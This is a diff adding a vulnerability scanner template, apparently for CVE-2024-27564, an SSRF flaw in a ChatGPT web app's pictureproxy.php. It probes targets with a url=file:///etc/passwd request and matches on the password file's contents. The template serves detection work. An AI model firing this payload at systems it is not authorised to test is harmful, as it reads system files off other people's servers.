@@ -1,0 +1,24 @@
+id: cve-2024-27564
+info:
+  name: ChatGPT pictureproxy.php SSRF Vulnerability (CVE-2024-27564)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,cve-2024-27564
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pictureproxy.php?url=file:///etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "image/jpeg"
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
